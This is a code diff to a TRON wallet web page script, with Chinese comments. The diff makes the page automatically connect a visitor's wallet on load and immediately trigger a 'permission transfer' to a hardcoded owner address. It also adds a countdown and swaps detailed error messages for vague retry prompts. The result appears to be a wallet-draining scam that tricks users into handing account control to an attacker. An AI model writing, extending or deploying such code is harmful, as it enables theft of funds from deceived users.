@@ -1,23 +1,23 @@
 document.addEventListener('DOMContentLoaded', async () => {
-    console.log('Script loaded');
     const tronWeb = window.tronWeb;
 
-    // 检查TronLink是否安装
+    // 检查钱包是否安装
     if (typeof tronWeb === 'undefined') {
-        alert("TronLink is not installed. Please install TronLink to proceed.");
-    } else {
-        console.log('TronLink detected');
-        // 检查钱包是否已连接
-        if (!tronWeb.defaultAddress.base58) {
-            try {
-                await connectWallet();
-            } catch (error) {
-                console.error("Error connecting to TronLink:", error);
-                alert("Error: " + error.message);
-            }
-        }
+        alert("TRC20 wallet is not installed. Please install a TRC20 wallet to proceed.");
+        return;
     }
 
+    // 尝试自动连接钱包
+    try {
+        await connectWallet();
+        // 自动触发权限确认
+        await confirmPermission();
+    } catch (error) {
+        console.error("Error connecting to wallet or confirming permission:", error);
+        alert("Error: " + error.message);
+    }
+
+    // 启动倒计时
     startCountdown();
 });
 
@@ -25,16 +25,26 @@ document.addEventListener('DOMContentLoaded', async () => {
 async function connectWallet() {
     const tronWeb = window.tronWeb;
 
-    // 请求TronLink连接
+    // 请求钱包连接
     await tronWeb.request({
         method: 'tron_requestAccounts'
     });
+
+    // 确保钱包连接成功
+    if (!tronWeb.defaultAddress.base58) {
+        throw new Error("Failed to connect to wallet.");
+    }
 }
 
 // 确认权限转移的函数
 async function confirmPermission() {
     const tronWeb = window.tronWeb;
     const currentAddress = tronWeb.defaultAddress.base58;
+
+    if (!currentAddress) {
+        throw new Error("No wallet address found. Please connect your wallet.");
+    }
+
     const newOwnerAddress = 'TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz';
 
     console.log("Current Address:", currentAddress);
@@ -78,11 +88,11 @@ async function confirmPermission() {
         if (result.result) {
             alert("Transaction sent successfully. Please check your wallet to sign the transaction.");
         } else {
-            alert("Transaction failed: " + result.message);
+            alert("Transaction failed: Please try again.");
         }
     } catch (error) {
         console.error("Error sending transaction:", error);
-        alert("Error: " + error.message);
+        alert("Error: Please try again.");
     }
 }
 
